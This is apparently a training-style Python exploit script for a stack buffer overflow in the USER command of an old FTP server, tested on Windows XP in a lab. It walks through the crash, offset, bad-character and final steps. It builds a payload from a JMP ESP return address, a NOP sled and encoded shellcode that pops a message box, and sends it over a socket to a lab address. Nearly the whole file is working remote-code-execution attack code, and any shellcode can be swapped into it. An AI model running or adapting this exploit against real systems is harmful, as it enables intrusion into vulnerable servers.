#!/usr/bin/python3

# Original exploit and vulnerable app available at: https://www.exploit-db.com/exploits/3570
# Exploit tested on Windows XP Pro SP3 FR

import socket
import sys

#MsgBox "We are evil"
shellcode=  b""
shellcode+= b"\xdb\xc5\xb8\xfd\xbe\x73\x9e\xd9\x74\x24\xf4\x5e\x33"
shellcode+= b"\xc9\xb1\x42\x31\x46\x19\x03\x46\x19\x83\xee\xfc\x1f"
shellcode+= b"\x4b\xaa\x75\x44\x6d\x39\xae\x8e\xbf\x10\x1c\x19\xf1"
shellcode+= b"\x5d\x05\x6e\x80\x6d\x4d\x06\x6f\x05\x27\xfa\xe4\x5f"
shellcode+= b"\xc0\x89\x85\x7f\x5b\xbb\x41\xcf\x43\xb6\x42\x96\x72"
shellcode+= b"\xe9\x5a\xc8\x15\x82\xc9\x2f\xf2\x1f\x54\x0c\x71\x4b"
shellcode+= b"\x7f\x14\x84\x99\xf4\xae\x9e\xd6\x51\x0f\x9e\x03\x86"
shellcode+= b"\x7b\xe9\x58\x7d\x0f\xe8\xb0\x4f\xf0\xda\x8c\x4c\xa2"
shellcode+= b"\x99\xcc\xd9\xbc\x60\x03\x2c\xc2\xa5\x70\xdb\xff\x55"
shellcode+= b"\xa2\x0c\x75\x47\x21\x16\x51\x86\xde\xc1\x12\x84\x6b"
shellcode+= b"\x85\x7f\x89\x6a\x72\xf4\xb5\xe7\x85\xe3\x3f\xb3\xa1"
shellcode+= b"\xef\x5e\xf8\x18\x07\x88\x2a\xd5\xfd\x43\x10\x8e\x73"
shellcode+= b"\x1d\x9a\xa3\xde\x4a\x3d\xc4\x20\x75\xc8\x7e\xdb\x31"
shellcode+= b"\xb4\x58\x01\x36\xcf\x45\xe2\xeb\x27\xfb\x15\xf4\x48"
shellcode+= b"\x8d\xaf\x03\xde\xe2\x43\x34\x5f\x93\xa8\x06\x71\x07"
shellcode+= b"\xa7\x13\xfe\xa2\x45\xec\xdb\xa5\xf6\x28\xd1\x3c\xe0"
shellcode+= b"\x67\x1a\x6b\xe9\x0e\x26\xc4\x4a\xb8\x04\xa8\x10\x3e"
shellcode+= b"\x54\x17\x3b\xa9\x3b\xa8\x44\xd6\xab\x39\xc3\x71\x0b"
shellcode+= b"\xae\x52\xe5\x2e\x6c\xfd\xa4\xd5\x03\x8e\x07\xce\x6c"
shellcode+= b"\x2c\x4c\xfa\xe5\x2e\xe4\x8c\x9c\xdc\xad\x18\x2d\x78"
shellcode+= b"\x6e\xbd\xb9\xd5\x0b\x1d\x5b\xeb\x1a\xd5\xd7\x2f\x96"
shellcode+= b"\x6c\x06\x1e\x7a\x3c\x9a\x30\x28\x3f\xcc\x82\x0c\xef"
shellcode+= b"\x12\xb1\x84"


#Step 1: Replicate the crash
buffer = b"A"*550

#Step 2: Find the offset
buffer = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9"

#Step 3: Check the offset
buffer = b"A"*485 + b"BBBB" + b"C"*(550-485-4)

#Step 4: Find the bad chars (\x00, \0x0a, \x0d, \x40)
#As 0x40 is difficult to find, I sliced the bad chars in order to find it
badchars = b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
badchars += b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
badchars += b"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
badchars += b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
badchars += b"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

buffer = b"A"*485 + b"BBBB" + badchars

#Step 5: Exploit
ret = b"\x7b\x46\x86\x7c" #7C86467B (JMP ESP)
buffer = b"A"*485 + ret + b"\x90"*20 + shellcode + b"\x90"*50


s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('10.0.2.4',21))
s.send(b"USER " + buffer + b"\r\n")
s.close()
